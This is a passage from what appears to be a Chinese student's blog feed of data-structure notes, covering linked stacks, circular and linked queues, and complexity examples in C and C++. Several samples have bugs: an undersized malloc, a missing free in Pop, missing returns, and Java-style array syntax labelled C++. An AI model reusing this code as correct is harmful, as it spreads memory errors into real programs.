class="hljs-params">(LinkStack* linkStack,ElemType* e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(linkStack==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e=(*linkStack)-&gt;data;<br>    (*linkStack)=(*linkStack)-&gt;next;<br><br>&#125;<br>status <span class="hljs-title function_">DestroyStack</span><span class="hljs-params">(LinkStack* linkStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(*linkStack==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>    StackNode* deleteNode=(*linkStack);<br>    <span class="hljs-keyword">while</span>(deleteNode!=<span class="hljs-literal">NULL</span>)&#123;<br>        (*linkStack)=(*linkStack)-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        deleteNode=<span class="hljs-literal">NULL</span>;<br>        deleteNode=(*linkStack);<br>        num++;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,num);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>ElemType <span class="hljs-title function_">GetTop</span><span class="hljs-params">(LinkStack* linkStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>((*linkStack)==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">return</span> (*linkStack)-&gt;data;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    LinkStack linkStack=<span class="hljs-literal">NULL</span>;<br>    InitStack(&amp;linkStack);<br>    <span class="hljs-type">int</span> e1=<span class="hljs-number">244</span>,e2=<span class="hljs-number">0</span>;<br>    Push(&amp;linkStack,e1);<br>    Pop(&amp;linkStack,&amp;e2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,e2);<br>    Push(&amp;linkStack,<span class="hljs-number">24</span>);<br>    e1= GetTop(&amp;linkStack);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,e1);<br>    DestroyStack(&amp;linkStack);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="栈与递归"><a href="#栈与递归" class="headerlink" title="栈与递归"></a>栈与递归</h3><ol><li><p>主调函数和被调函数</p><p>如：<code>main</code>函数就是主调函数，在里面调用的函数被称为被调函数</p></li><li><p>函数的嵌套调用的方式</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%87%BD%E6%95%B0%E7%9A%84%E5%B5%8C%E5%A5%97%E8%B0%83%E7%94%A8%E7%9A%84%E5%8E%9F%E7%90%86.png"></p></li></ol><h2 id="队列的表示和操作原理"><a href="#队列的表示和操作原理" class="headerlink" title="队列的表示和操作原理"></a>队列的表示和操作原理</h2><ol><li>只能在表尾经行插入操作，在表头进行删除操作的线性表</li><li>先进先出的线性表</li><li>有顺序结构和链式结构（常用的是顺序结构）</li></ol><h3 id="队列的相关操作"><a href="#队列的相关操作" class="headerlink" title="队列的相关操作"></a>队列的相关操作</h3><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%98%9F%E5%88%97%E7%9A%84%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C.png"></p><h3 id="队列的顺序表示和实现"><a href="#队列的顺序表示和实现" class="headerlink" title="队列的顺序表示和实现"></a>队列的顺序表示和实现</h3><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%98%9F%E5%88%97%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93.png"></p><ol><li><p>对空的表示</p><p><code>front</code>&#x3D;<code>rear</code>&#x3D;<code>0</code></p></li><li><p>队列的特殊情况</p><p><img src="C:\Users\12414\Desktop\hexo\source_posts\栈和队列.assets\image-20230402182219032.png"></p></li><li><p>假溢出和真溢出</p><ul><li><p>假溢出</p><p><code>rear</code>!&#x3D;<code>0</code></p><p><code>rear</code>&#x3D;<code>MAXQSIZE</code> 但是队列中还有空余的存储空间</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%81%87%E6%BA%A2%E5%87%BA.png"></p></li><li><p>真溢出</p><p><code>rear</code>&#x3D;<code>0</code></p><p><code>fear</code>&#x3D;<code>MAXQSIZE</code></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E7%9C%9F%E6%BA%A2%E5%87%BA.png"></p></li></ul></li><li><p>循环队列的处理逻辑</p><ul><li><p>使用<code>%</code>运算，将数组变成循环 </p></li><li><p>但是用循环队列的是时候，我们面对的是对空和对满是一种判断条件，所以我们使用标志经行判断</p><p>一下提出三种解决办法</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/%E4%B8%89%E7%A7%8D%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.png"></p></li></ul></li><li><p>头文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><br><span class="hljs-keyword">using</span> ElemType=<span class="hljs-type">int</span>;<br><span class="hljs-keyword">using</span> status=<span class="hljs-type">int</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> ERROR=<span class="hljs-number">-1</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXSIZE=<span class="hljs-number">10</span>;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Que</span>&#123;<br><br><span class="hljs-keyword">private</span>:<br>    ElemType* base;<br>    <span class="hljs-type">int</span> front;<span class="hljs-comment">//地址更小的指针</span><br>    <span class="hljs-type">int</span> rear;<span class="hljs-comment">//地址更大的指针</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Que</span>();<br>    ~<span class="hljs-built_in">Que</span>();<br>    <span class="hljs-function">status <span class="hljs-title">ClearQueue</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QueueLength</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">GetHead</span><span class="hljs-params">(ElemType&amp; e)</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">EnQueue</span><span class="hljs-params">(ElemType e)</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">DeQueue</span><span class="hljs-params">(ElemType &amp;e)</span></span>;<br>&#125;;<br><br></code></pre></td></tr></table></figure></li><li><p>类的实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br>Que::<span class="hljs-built_in">Que</span>() &#123;<br>    base= <span class="hljs-literal">nullptr</span>;<br>    base=<span class="hljs-keyword">new</span> ElemType [MAXSIZE];<br>    <span class="hljs-keyword">if</span>(base== <span class="hljs-literal">nullptr</span>)&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;base new ERROR&quot;</span>&lt;&lt;std::endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    front=<span class="hljs-number">0</span>;<br>    rear=<span class="hljs-number">0</span>;<br>&#125;<br><br>Que::~<span class="hljs-built_in">Que</span>() &#123;<br>    <span class="hljs-keyword">delete</span>[] base;<br>    front=<span class="hljs-number">0</span>;<br>    rear=<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Que::status Que::ClearQueue() &#123;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    return 0;</span><br><span class="hljs-comment">&#125;*/</span><br><br><span class="hljs-comment">//这个算法需要想清楚</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Que::QueueLength</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (rear-front+MAXSIZE)%MAXSIZE;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Que::GetHead</span><span class="hljs-params">(ElemType &amp;e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(rear==front)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    e=*(base+front);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Que::EnQueue</span><span class="hljs-params">(ElemType e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>((rear+<span class="hljs-number">1</span>)%MAXSIZE==front)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    *(base+rear)=e;<br>    rear=(rear+<span class="hljs-number">1</span>)%MAXSIZE;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Que::DeQueue</span><span class="hljs-params">(ElemType &amp;e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(rear==front)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    e=*(base+front);<br>    front=(front+<span class="hljs-number">1</span>)%MAXSIZE;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p><code>main.cpp</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;myClass.hpp&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">creatQ</span><span class="hljs-params">(Que &amp;que)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAXSIZE; ++i) &#123;<br>        que.<span class="hljs-built_in">EnQueue</span>(i + <span class="hljs-number">10</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printQueue</span><span class="hljs-params">(Que &amp;que)</span> </span>&#123;<br>    <span class="hljs-type">int</span> e;<br>    <span class="hljs-keyword">while</span> (que.<span class="hljs-built_in">GetHead</span>(e)) &#123;<br>        std::cout &lt;&lt;<span class="hljs-string">&quot;Get: &quot;</span>&lt;&lt; e &lt;&lt; std::endl;<br>        que.<span class="hljs-built_in">DeQueue</span>(e);<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;delete: &quot;</span>&lt;&lt;e&lt;&lt;std::endl;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Que queue;<br>    ElemType elemType = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> e;<br>    queue.<span class="hljs-built_in">EnQueue</span>(<span class="hljs-number">244</span>);<br>    std::cout &lt;&lt; queue.<span class="hljs-built_in">QueueLength</span>() &lt;&lt; std::endl;<br>    std::cout &lt;&lt; queue.<span class="hljs-built_in">GetHead</span>(e) &lt;&lt; std::endl;<br>    std::cout &lt;&lt; e &lt;&lt; std::endl;<br>    <span class="hljs-built_in">creatQ</span>(queue);<br>    std::cout &lt;&lt; queue.<span class="hljs-built_in">QueueLength</span>() &lt;&lt; std::endl;<br>    <span class="hljs-built_in">printQueue</span>(queue);<br>    std::cout &lt;&lt; queue.<span class="hljs-built_in">DeQueue</span>(elemType) &lt;&lt; std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h3 id="队列链式实现"><a href="#队列链式实现" class="headerlink" title="队列链式实现"></a>队列链式实现</h3><ol><li><p>节点的实现</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%98%9F%E5%88%97%E9%93%BE%E5%BC%8F%E7%9A%84%E8%8A%82%E7%82%B9.png"></p></li><li><p>基本定义</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%93%BE%E5%BC%8F%E9%98%9F%E5%88%97%E7%9A%84%E5%AE%9A%E4%B9%89.png"></p></li><li><p>代码实例（注意win上面竟然过不了）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QNode</span> &#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QNode</span> *<span class="hljs-title">next</span>;</span><br>&#125; QNode, *QueuePtr;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LinkQueue</span> &#123;</span><br>    QueuePtr rear;<br>    QueuePtr front;<br>&#125; LinkQueue, *LinkQNode;<br><br>status <span class="hljs-title function_">InitNode</span><span class="hljs-params">(LinkQNode *linkQueue)</span> &#123;<br>    QueuePtr queuePtr = (QNode *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(QNode));<br>    queuePtr-&gt;next = <span class="hljs-literal">NULL</span>;<br>    queuePtr-&gt;data = <span class="hljs-number">0</span>;<br>    (*linkQueue)-&gt;front = queuePtr;<br>    (*linkQueue)-&gt;rear = queuePtr;<br>&#125;<br><br>status <span class="hljs-title function_">DestroyNode</span><span class="hljs-params">(LinkQNode *linkQueue)</span> &#123;<br>    <span class="hljs-keyword">if</span> (*linkQueue == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    QNode *deleteNode = (*linkQueue)-&gt;front;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (deleteNode != <span class="hljs-literal">NULL</span>) &#123;<br>        (*linkQueue)-&gt;front = (*linkQueue)-&gt;front-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        deleteNode = <span class="hljs-literal">NULL</span>;<br>        deleteNode = (*linkQueue)-&gt;front;<br>        num++;<br>    &#125;<br>    (*linkQueue)-&gt;rear = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">free</span>(*linkQueue);<br>    (*linkQueue)=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">CreatLinkQueue</span><span class="hljs-params">(LinkQNode *linkQueue)</span> &#123;<br>    (*linkQueue) = (LinkQueue *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(linkQueue));<br>    <span class="hljs-keyword">if</span> ((*linkQueue) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    (*linkQueue)-&gt;front = <span class="hljs-literal">NULL</span>;<br>    (*linkQueue)-&gt;rear = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">GetHead</span><span class="hljs-params">(LinkQNode *linkQNode, ElemType *e)</span> &#123;<br>    *e = (*linkQNode)-&gt;front-&gt;next-&gt;data;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">EnQueue</span><span class="hljs-params">(LinkQNode *linkQNode, ElemType e)</span> &#123;<br>    QNode *qNode = (QNode *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(QNode));<br>    <span class="hljs-keyword">if</span> (qNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    qNode-&gt;data = e;<br>    qNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> ((*linkQNode)-&gt;front == (*linkQNode)-&gt;rear) &#123;<br>        (*linkQNode)-&gt;front-&gt;next = qNode;<br>    &#125;<br>    (*linkQNode)-&gt;rear-&gt;next = qNode;<br>    (*linkQNode)-&gt;rear = qNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">DeQueue</span><span class="hljs-params">(LinkQNode *linkQNode, ElemType *e)</span> &#123;<br>    <span class="hljs-keyword">if</span> ((*linkQNode) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    QNode *qNode;<br>    *e = (*linkQNode)-&gt;front-&gt;next-&gt;data;<br>    qNode = (*linkQNode)-&gt;front-&gt;next;<br>    (*linkQNode)-&gt;front-&gt;next = (*linkQNode)-&gt;front-&gt;next-&gt;next;<br>    <span class="hljs-built_in">free</span>(qNode);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    LinkQNode linkQNode;<br>    ElemType e;<br>    CreatLinkQueue(&amp;linkQNode);<br>    InitNode(&amp;linkQNode);<br>    EnQueue(&amp;linkQNode, <span class="hljs-number">1</span>);<br>    EnQueue(&amp;linkQNode, <span class="hljs-number">244</span>);<br>    GetHead(&amp;linkQNode, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, e);<br>    DeQueue(&amp;linkQNode, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, e);<br>    GetHead(&amp;linkQNode, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, e);<br>    DestroyNode(&amp;linkQNode);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>线性表</title>
    <link href="/2023/03/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
    <url>/2023/03/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="时间和空间复杂度"><a href="#时间和空间复杂度" class="headerlink" title="时间和空间复杂度"></a>时间和空间复杂度</h3><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20230322151152567.png" alt="image-20230322151152567"></p><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20230322151451180.png" alt="image-20230322151451180"></p><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><ol><li><p>使用big O计数法</p></li><li><p>实例</p><ul><li><p>O(1)  常量级的算法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> b=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> c=<span class="hljs-number">0</span>;<br>a=b;<br>a=c;<br>b=c;<br><span class="hljs-comment">//就算重复1000000+都是一个常量</span><br></code></pre></td></tr></table></figure></li><li><p>O(n)   </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;++i)&#123;<br>    <span class="hljs-comment">//代码</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>O(logN) </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">while</span>(i&lt;n)&#123;<br>    i*=<span class="hljs-number">2</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><img src="C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322182248288.png" alt="image-20230322182248288" style="zoom:50%;" /></li><li><p>O(NM)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;m;++j)&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><ol><li><p>实例</p><ul><li><p>O(1)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> b=<span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li><li><p>O(n)  new 一个维数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span>[] newArray = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[n];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;++i)&#123;<br>    newArray[i]=i;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>O(n*n)  new 二个维数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> [][] newArray = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[n][n];<br></code></pre></td></tr></table></figure></li></ul></li></ol><h3 id="线性表（案例分析）"><a href="#线性表（案例分析）" class="headerlink" title="线性表（案例分析）"></a>线性表（案例分析）</h3><ol><li><p>线性表具有同一种特性的数据元素的一个有限的序列</p><p>![image-20230322183519529](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322183519529.png)</p></li><li><p>注意</p><ul><li>下标由1开始</li></ul></li><li><p>基本代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX =<span class="hljs-number">100</span>;<br><span class="hljs-comment">//顺序结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">List</span>&#123;<br>    ELETMENT List[MAX];<br>    <span class="hljs-type">int</span> listLenth;<br>&#125;List;<br></code></pre></td></tr></table></figure><p><img 